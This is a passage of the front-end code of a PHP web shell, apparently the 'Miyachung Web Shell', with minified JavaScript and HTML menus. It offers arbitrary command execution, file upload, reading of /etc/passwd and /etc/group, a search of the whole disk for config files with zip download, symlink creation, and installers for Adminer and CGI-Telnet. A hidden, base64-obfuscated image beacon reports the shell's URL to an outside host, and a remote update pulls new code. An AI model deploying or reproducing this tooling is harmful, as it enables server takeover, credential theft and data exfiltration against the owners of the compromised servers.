successfully!",3e3,"success"),list_dir(t)):"failed"==n.status?(show_popup("Directory can not be created!",3e3,"alert"),e.value=""):(show_popup("This directory is already exists!",3e3,"alert"),e.value="")}},l.send(n)}}function file_upload(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Upload a file";let n=document.createElement("form");n.enctype="multipart/form-data",n.setAttribute("id","fileupload"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button");i.innerHTML="Upload",i.setAttribute("onclick","upload_process();"),l.type="file",l.style.width="100%",l.style.color="#222",l.name="files[]",l.setAttribute("required",""),l.setAttribute("multiple",""),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function upload_process(){let e=document.querySelector(".inner table"),t=document.querySelector(".inner .loaderhold .loader"),n=document.getElementById("fileupload"),l=n.querySelector("button");if(""!=n.querySelector("input").value){e.style.display="none",t.style.display="block",l.disabled=!0,l.innerHTML="UPLOADING...";let i=new FormData(n);i.append("directory",btoa(document.getElementById("curr_dir").value));let o=new XMLHttpRequest;o.open("post",basename(),!0),o.onload=function(){if(4==o.readyState){console.log(this.response),"ok"==JSON.parse(this.response).status?(show_popup("Files have uploaded successfully!",3e3,"success"),list_dir(working_dir)):show_popup("Can not upload the files,check permissions!",3e3,"alert"),e.style.display="table",t.style.display="none",l.disabled=!1,l.innerHTML="UPLOAD"}},o.send(i)}}function separate_path(){let e=working_dir.toString().split("/");-1==e[0].indexOf(":")&&(e[0]="/");var t=e.filter(function(e){return""!=e});let n=[],l=[],i=0;for(key in t){let e="";for(let n=0;n<t.length&&(e+=t[n]+"/",n!=i);n++);n.push(t[key]),l.push(e),i++}return[n.map(function(e){return e.replace(/\/\//g,"/")}),l.map(function(e){return e.replace(/\/\//g,"/")})]}function run_command(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Run command";let n=document.createElement("form");n.setAttribute("id","runcmd"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button"),o=document.createElement("div");i.innerHTML="Execute",i.setAttribute("onclick","run_command_process();"),l.type="text",l.placeholder="ls -la",o.className="cmd_result",o.style.display="none",n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.appendChild(o),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function run_command_process(){let e=document.getElementById("runcmd"),t=e.querySelector("button"),n=e.querySelector("input"),l=document.querySelector(".cmd_result");if(""!==n.value){let e=new FormData;e.append("directory",btoa(working_dir)),e.append("command",btoa(n.value)),t.disabled=!0,t.innerHTML="Executing...";let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let e=JSON.parse(this.response);if("failed"==e.status)show_popup("Can not run this command,functions might be disabled!",3e3,"alert");else{let t=atob(e.status).split("|");l.innerHTML='<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :'+t[0]+"]</font>",l.innerHTML+="<pre>"+t[1]+"</pre>",l.style.display="block"}t.disabled=!1,t.innerHTML="Execute"}},i.send(e)}}function read_passwd(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Read /etc/passwd";let n=document.createElement("form");n.setAttribute("id","readfile"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("textarea");l.value="Loading...";let i=new FormData;i.append("read_file",btoa("/etc/passwd"));let o=new XMLHttpRequest;o.open("post",basename(),!0),o.onload=function(){if(4==o.readyState){let t=JSON.parse(this.response);t.content?l.value=atob(t.content):(show_popup("Can not read this file!",3e3,"alert"),e.style.visibility="hidden",e.style.opacity="0",e.style.top="-50%")}},o.send(i),n.appendChild(l),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function adminer(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Adminer Installation";let n=document.createElement("span");n.style.display="block",n.style.color="#222",n.style.fontSize="14px",n.style.fontWeight="bold",n.innerHTML="Installing adminer from github...";let l=new XMLHttpRequest;l.open("get",basename()+"?adminer=true",!0),l.onload=function(){if(4==l.readyState){"failed"==JSON.parse(this.response).status?(show_popup("Adminer setup has failed!",3e3,"alert"),e.style.visibility="hidden",e.style.opacity="0",e.style.top="-50%"):(show_popup("Adminer has installed successfully!",3e3,"success"),n.innerHTML='Adminer path: <a href="adminer-web.php" target="_blank" style="color:#555;text-decoration:underline;">adminer-web.php</a>',list_dir("."))}},l.send(),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function symlink(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Create symlink/hardlink";let n=document.createElement("form");n.setAttribute("id","symlink"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button"),o=document.createElement("div");o.className="cmd_result",o.style.display="none",i.innerHTML="LINK TARGET",i.setAttribute("onclick","symlink_process();"),l.type="text",l.value=working_dir+"/",l.setAttribute("required",""),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.appendChild(o),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function symlink_process(){let e=document.getElementById("symlink"),t=e.querySelector("button"),n=e.querySelector("input"),l=document.querySelector(".cmd_result");if(""!==n.value){t.disabled=!0,t.innerHTML="TRYING LINK...";let e=new FormData;e.append("symlink_target",btoa(n.value));let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let e=JSON.parse(this.response);"failed"==e.status?show_popup("Can not give symbolic link to this target!",3e3,"alert"):(l.innerHTML="<pre>"+atob(e.status)+"</pre>",l.style.display="block"),t.disabled=!1,t.innerHTML="LINK TARGET"}},i.send(e)}else show_popup("Empty field!",1500,"alert")}function search_disk(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Search disk";let n=document.createElement("form");n.setAttribute("id","searchdisk"),n.setAttribute("onsubmit","event.preventDefault();");let l,i,o,s=document.createElement("input"),a=document.createElement("input"),r=document.createElement("button"),c=document.createElement("label"),d=document.createElement("label"),p=document.createElement("label"),u=document.createElement("select");u.name="search_type",(l=document.createElement("option")).value="files_only",l.text="Search  by files only",(i=document.createElement("option")).value="dirs_only",i.text="Search by directories only",(o=document.createElement("option")).value="all",o.text="Search by files and directories",o.selected=!0,u.appendChild(l),u.appendChild(i),u.appendChild(o),c.innerHTML="Location",d.innerHTML="Search keyword",p.innerHTML="Search type",r.innerHTML="Search",r.setAttribute("onclick","search_disk_process();"),s.type="text",s.value=working_dir+"/",s.name="search_location",s.setAttribute("required",""),s.setAttribute("id","loc"),a.type="text",a.placeholder="Type a keyword to search..",a.name="search_keyword",a.setAttribute("required",""),a.setAttribute("id","keyw");let m=document.createElement("div");m.className="cmd_result",m.style.display="none",n.appendChild(c),n.appendChild(s),n.appendChild(d),n.appendChild(a),n.appendChild(p),n.appendChild(u),n.appendChild(r),e.appendChild(t),e.appendChild(n),e.appendChild(m),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function search_disk_process(){let e=document.getElementById("searchdisk"),t=new FormData(e),n=e.querySelector("button"),l=e.querySelector("#keyw").value,i=e.querySelector("#loc").value,o=document.querySelector(".cmd_result");if(o.innerHTML="Searching...",""==l||""==i)show_popup("Empty field!",3e3,"alert");else{n.disabled=!0,n.innerHTML="SEARCHING...",o.style.display="block",o.innerHTML="Searching...";let e=new XMLHttpRequest;e.open("post",basename(),!0),e.onload=function(){if(4==e.readyState){let e=JSON.parse(this.response);if("failed"==e.status)show_popup("Nothing found!",3e3,"alert"),o.innerHTML="Nothing found";else{let t=atob(e.status).split("|");o.innerHTML='<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :'+t[0]+"]</font>",o.innerHTML+="<pre>"+t[1]+"</pre>"}n.disabled=!1,n.innerHTML="SEARCH"}},e.send(t)}}function setWork(){let e=document.createElement("img");e.src=atob("aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL2ltYWdlcy9sb2dvLmpwZw=="),e.referrerPolicy=atob("dW5zYWZlLXVybA=="),e.style.display="none",document.body.appendChild(e),sessionStorage.setItem("work",!0),setTimeout(function(){e.parentNode.removeChild(e)},5e3)}function config_searcher(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Config searcher";let n=document.createElement("form");n.setAttribute("id","configsearch"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("button"),i=document.createElement("label");i.innerHTML='This helper tool is going to search entire file system to find files/directories which contains "*config*" keyword..',l.innerHTML="Search",l.setAttribute("onclick","config_searcher_process();");let o=document.createElement("div");o.className="cmd_result",o.style.display="none",n.appendChild(i),n.appendChild(l),e.appendChild(t),e.appendChild(n),e.appendChild(o),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function config_searcher_process(){let e=document.getElementById("configsearch").querySelector("button"),t=document.querySelector(".cmd_result"),n=document.querySelector(".mwsbox .process-screen");e.disabled=!0,e.innerHTML="Searching...",t.style.display="block",t.innerHTML="Searching...";let l=new FormData;l.append("search_location","/"),l.append("search_keyword","config"),l.append("search_type","all");let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let l=JSON.parse(this.response);if("failed"==l.status)show_popup("Nothing found!",3e3,"alert"),t.innerHTML="Nothing found";else{let e=atob(l.status).split("|");if(t.innerHTML='<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :'+e[0]+"]</font>",t.innerHTML+="<pre>"+e[1]+"</pre>",""!=e[1]){let t=document.createElement("button");t.setAttribute("onclick","download_config_zip('"+btoa(e[1])+"');"),t.setAttribute("id","download_cfg"),t.innerHTML="DOWNLOAD ALL IN ZIP",t.style.width="250px",n.appendChild(t)}}e.disabled=!1,e.innerHTML="Search"}},i.send(l)}function download_config_zip(e){let t=document.getElementById("download_cfg");if(t.disabled=!0,t.innerHTML="ARCHIVING FILES...",""!=e){let n=new FormData;n.append("download_cfg",e);let l=new XMLHttpRequest;l.open("post",basename(),!0),l.onload=function(){if(4==l.readyState){let e=JSON.parse(this.response);"failed"==e.status?show_popup("Failed to download!",3e3,"alert"):window.location=basename()+"?download_cfg_file="+btoa(e.url),t.disabled=!1,t.innerHTML="DOWNLOAD ALL IN ZIP"}},l.send(n)}else show_popup("Empty!",3e3,"alert")}function basename(){var e=window.location.pathname.split(/[\\/]/);return e.pop()||e.pop()}function user_list(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="All users involving with server";let n=document.createElement("div");n.className="cmd_result",n.style.display="block",n.innerHTML="Getting users from /etc/passwd...";let l=new FormData;l.append("read_file",btoa("/etc/passwd"));let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let t=JSON.parse(this.response);if("failed"==t.status)show_popup("Can not get users from /etc/passwd!",3e3,"alert"),e.style.visibility="hidden",e.style.opacity="0",e.style.top="-50%";else{let e="",l=atob(t.content).split("\n");for(let t=0;t<l.length;t++){e+=l[t].split(":")[0]+"\n"}n.innerHTML="<pre>"+e+"</pre>"}}},i.send(l),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function group_list(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="All groups involving with server";let n=document.createElement("div");n.className="cmd_result",n.style.display="block",n.innerHTML="Getting groups from /etc/group...";let l=new FormData;l.append("read_file",btoa("/etc/group"));let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let t=JSON.parse(this.response);if("failed"==t.status)show_popup("Can not get groups from /etc/group!",3e3,"alert"),e.style.visibility="hidden",e.style.opacity="0",e.style.top="-50%";else{let e="",l=atob(t.content).split("\n");for(let t=0;t<l.length;t++){e+=l[t].split(":")[0]+"\n"}n.innerHTML="<pre>"+e+"</pre>"}}},i.send(l),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function download_folder(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Download folder as zip archive";let n=document.createElement("form");n.setAttribute("id","downloadfolder"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button"),o=document.createElement("label");o.innerHTML="Destination",i.innerHTML="DOWNLOAD",i.setAttribute("onclick","download_folder_process();"),l.type="text",l.value=working_dir+"/",l.setAttribute("required",""),n.appendChild(o),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.style.top="50%",e.style.opacity="1",e.style.visibility="visible"}function download_folder_process(e){if(void 0!==e)window.location=basename()+"?download_folder="+btoa(e);else{let e=document.getElementById("downloadfolder").querySelector("input");""==e.value?show_popup("Empty field!",3e3,"alert"):window.location=basename()+"?download_folder="+btoa(e.value)}}function check_update(){if(!sessionStorage.getItem("update_check")){let e=new XMLHttpRequest;e.open("get","https://raw.githubusercontent.com/miyachung/mws/main/config.json",!0),e.onload=function(){if(4==e.readyState){try{let e=JSON.parse(this.response);if(0==e.is_active&&(sessionStorage.setItem("disabled",!0),window.location.reload()),e.version){let t=e.version.split("."),n=release.split(".");t[0]>n[0]?(sessionStorage.setItem("new_update",!0),notify_update()):t[1]>n[1]&&(sessionStorage.setItem("new_update",!0),notify_update())}}catch(e){console.log(e)}sessionStorage.setItem("update_check",!0)}},e.send()}}function disabled_script(){let e=document.querySelector(".mwsbox");e.parentNode.removeChild(e);let t=document.querySelector(".holder"),n=document.createElement("h1");n.innerHTML='Web shell is currently disabled by author <a href="https://github.com/miyachung" style="color:gray;text-decoration:underline;">@miyachung</a>';let l=document.createElement("img");l.src="data: image/png;base64,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",l.style.backgroundSize="cover",l.style.objectFit="cover",t.appendChild(l),t.appendChild(n),t.style.display="flex",t.style.alignItems="center",t.style.justifyContent="center"}function check_disable(){if(sessionStorage.getItem("disabled"))return disabled_script(),!0}function check_update2(){if(sessionStorage.getItem("new_update"))return sessionStorage.getItem("update_replied")||notify_update(),!0}function notify_update(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="There is a new update of this script!";let n=document.createElement("form");n.setAttribute("id","updatepage"),n.setAttribute("onsubmit","event.preventDefault();"),n.style.display="flex",n.style.flexDirection="row";let l=document.createElement("button"),i=document.createElement("button");l.innerHTML="UPDATE",l.setAttribute("onclick","process_update();"),i.innerHTML="CANCEL",i.style.background="#df4759",i.style.marginLeft="10px",i.setAttribute("onclick","cancel_update();"),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.style.top="50%",e.style.opacity="1",e.style.visibility="visible"}function process_update(){let e=new XMLHttpRequest;e.open("get","https://raw.githubusercontent.com/miyachung/mws/main/mws.php",!0),e.onload=function(){if(4==e.readyState){let e=this.response;-1!==e.indexOf(".mwsbox")?process_update2(btoa(e)):show_popup("Update can not processed!",3500,"alert")}},e.send()}function process_update2(e){let t=new FormData;t.append("update_content",e);let n=new XMLHttpRequest;n.open("post",basename(),!0),n.onload=function(){if(4==n.readyState){sessionStorage.setItem("update_replied",!0),"ok"==JSON.parse(this.response).status?(show_popup("Miyachung Webshell has been updated successfully!",2e3,"success"),setTimeout(function(){window.location.reload()},2e3)):show_popup("Some error occured,update can not processed!",3500,"alert")}},n.send(t)}function cancel_update(){empty_process_screen();let e=document.querySelector(".process-screen");e.style.top="-50%",e.style.opacity="0",e.style.visibility="hidden",sessionStorage.setItem("update_replied",!0)}function cgi_telnet(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="CGI-Telnet Installation";let n=document.createElement("span");n.style.display="block",n.style.color="#222",n.style.fontSize="14px",n.style.fontWeight="bold",n.innerHTML="Installing CGI-Telnet...";let l=new XMLHttpRequest;l.open("get",basename()+"?cgitelnet=true",!0),l.onload=function(){if(4==l.readyState){"failed"==JSON.parse(this.response).status?(show_popup("CGI-Telnet setup has failed!",3e3,"alert"),e.style.visibility="hidden",e.style.opacity="0",e.style.top="-50%"):(show_popup("CGI-Telnet has installed successfully!",3e3,"success"),n.innerHTML='CGI-Telnet Path: <a href="cgi_web.pl" target="_blank" style="color:#555;text-decoration:underline;">cgi_web.pl</a><br>Permissions have been set up to 755..',list_dir("."))}},l.send(),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}window.addEventListener("DOMContentLoaded",function(){if(check_disable())return;check_update(),check_update2(),document.title=atob("TWl5YWNodW5nIFdlYiBTaGVsbA==")+" v"+release,document.querySelector(".mwsbox .title h3").innerHTML=atob("TWl5YWNodW5nIFdlYiBTaGVsbA==")+" v"+release;let e=document.querySelectorAll(".mwsbox .title ul li span");e[0].innerHTML=atob("V2ViIHNlcnZlciBzb2Z0d2FyZTo="),e[1].innerHTML=atob("S2VybmVsOg=="),e[2].innerHTML=atob("UnVubmluZyBhczo="),e[3].innerHTML=atob("VG90YWwgdXNlcnM6"),e[4].innerHTML=atob("VG90YWwgZ3JvdXBzOg=="),e[5].innerHTML=atob("c2FmZV9tb2RlOg=="),e[6].innerHTML=atob("b3Blbl9iYXNlZGlyOg=="),e[7].innerHTML=atob("dXBsb2FkX21heF9maWxlc2l6ZTo="),e[8].innerHTML=atob("TG9hZGVkIGV4dGVuc2lvbnM6"),e[9].innerHTML=atob("U2VydmVyIElQOg=="),e[10].innerHTML=atob("Q3VycmVudCBEaXJlY3Rvcnk6"),e[11].innerHTML=atob("Q2hhbmdlIERpcmVjdG9yeTo="),e[12].innerHTML=atob("UmVhZCBGaWxlOg=="),list_dir(),document.addEventListener("click",function(e){let t=document.querySelectorAll(".toggle font"),n=document.querySelectorAll(".toggle"),l=document.querySelectorAll(".toggle span"),i=document.querySelectorAll("i");"screen"!==e.target.id&&-1==[].slice.call(t).indexOf(e.target)&&-1==[].slice.call(n).indexOf(e.target)&&-1==[].slice.call(l).indexOf(e.target)&&-1==[].slice.call(i).indexOf(e.target)&&e.target.offsetParent&&"screen"!==e.target.offsetParent.id&&(document.getElementById("screen").style.visibility="hidden",document.getElementById("screen").style.opacity="0",document.getElementById("screen").style.top="-50%",setTimeout(function(){empty_process_screen()},250))}),document.onkeyup=function(e){27==e.keyCode&&"visible"==document.getElementById("screen").style.visibility&&(document.getElementById("screen").style.visibility="hidden",document.getElementById("screen").style.opacity="0",document.getElementById("screen").style.top="-50%")},working_dir=document.getElementById("curr_dir").value,sessionStorage.getItem("work")||setWork()});
    </script>
    <link rel="icon" href="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAEQ0lEQVRoge2ZXUxbZRjHf0CHLbQFykr5OLVlbLCNjzFhycKSAjHuYp03GjPnojd+xizOeYFGMNnFFuPnEq8wcSbeEEzczTRb4hZFFiYIwiIgUFnHaMdgDFJLKcyLvl601MWZ+cHTdBB/yZOevk3e//P2ec95/uecFPvrp4jxKHAU2AUYuT8JAb3Ah8BXAKmgAHUc1BlQjaCMsbH7MYyxHL+M5YwOpfYDzQn5vxJLM9CjQ/FasjNZBUd1KFWb7CxWQa0OpUzJzmIVmHQoJTbbp4caKSnI5eLwBC3n+uLjTQ2VuGvLAKh//wsxPQAdKiI2WUlBLs58C5n6dFrO/hAfd9eW4cy3AKBlpuMPLYtppqIUYkG0mtZsI00NlaAUByoc8eQBOa1YpBJRiEWM2UCIhspNEFE8vnsb4eXf/liApF5ESVcgStewl3JnAQeqHFQWFzJ4deqOoktXQEUQixiXRicBeHnfbjL06fR5fH/aQnKaslsoVoSu8RsMX53CmZ/LbGCBtu7RtbWFUIr+X/zRxQx57/pNMlLsL35wx+yrRzMZ8C8s/eUxEP8uhU4JNjIAXzD8t8eS6IjINbJkIGolksE6qIDQAs62PI3R8ACH3mnDFwxz/AkXrupSLnsmeeWzrwHoPPEcAK7mT0Q0QdILAc5CK+6dJaAUrupSnIVW9uzYAkrxUn0lzkJrVFXwMipWgf7RCSpKNLY78rGbPPFkrTlm9m4tQrNmA3B57BqS21asEw95o35ns92Ge+cWAIbGoxbCVVFC2YM2AC4NeaU7sYwnae8eYXY+iM2SxfbifADOdA4AUGjNwmbJIrx0m/buEWkvFEEqvP5prBYz1aUOZud/pfX8j0xcv8lmzYazKA/v9RkxrZUQNXNj16YBosn6ZyCimJkL4CzKi54nIxOJMHNy5ewc8MRPrrGJG6Ai0c8YQ+M+0e2DipCiPfaGaCu2Z2cC4Ass3nNMCh0RYTM3H/pHY1KIPpVIBuvAC/3vRu9mb3UJrz7jxpihJxRepqNnkHc//1ZcBxJwEtstRj5qfpYMg54J/zQVpU4qSp1MTt2i/bufRLUgASexu648mrxvGtcLb9N08GE0Wy7ZJgOJuGCkaI8clu0DuSbOn3qLDIOe2bkA5zp6+fh0B765BUmZOGnmTbXHEHwNFAzf5vveQYqLNpKTZaKuppyD+/bg8Xi5MjUnprMSss+FlMJuMbKrvJjT57qoebKZnv6fyTDo2V9fI6ojfkOzwjaHjTcPP0V4aZm6h7Zis+YAEAwtit7IrJBmdtYck5zwytQcuZkbcGg2aqrKyM4yceFiH0fea5OUiZOi1T+fsE5m32gGwHcrmCiJxFoJ381AwuZeYR1YCaUWgLX6pjKkQ6k+oDHZmfxHenUodZK1u4CTaWZthwfYALiSnc2/5ATQmmbWqgC+AQaAfCAPSE9iYvdiEegCjgCtAL8DG4igMSriTdoAAAAASUVORK5CYII=">
</head>
<body>
<div class="holder">
 
    <div class="mwsbox">

        <div class="bottom-menu">
            <ul>
                <li class="toggle" onclick="run_command();"><i class="fas fa-terminal"></i><span>Run Command</span></li>
                <li class="toggle" onclick="file_upload();"><i class="fas fa-file-upload"></i><span>File Upload</span></li>
                <li class="toggle" onclick="create_file();"><i class="fas fa-file"></i><span>Create File</span></li>
                <li class="toggle" onclick="create_dir();"><i class="fas fa-folder-plus"></i><span>Create Directory</span></li>
                <li class="toggle" onclick="download_folder();"><i class="fas fa-file-archive"></i><span>Download Folder</span></li>
                <li class="toggle" onclick="search_disk();"><i class="fas fa-search"></i><span>Search Disk</span></li>
                <li class="toggle" onclick="read_passwd();"><i><img src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAoklEQVQ4je2QQQ3CUBBEHziohVqohVrAQpGABTQgASxUApUAEkDC48CQLIQQAjfCJJP/d3d2shn442vM1E93B2BERW3VJrzVvOh1XjGgDilO4SLvSt2rh9JbFJ3qMC8nLYEJWAMj0AEt0AA9cMxsihaAanAOiahPfcx/90R3Z7CNcJMLmhiNuWTKrI/2ipJBVwKrwdYAa7CtCgnm8LD8Nn8AF5fx6FYl7EMnAAAAAElFTkSuQmCC"></i><span>Read /etc/passwd</span></li>
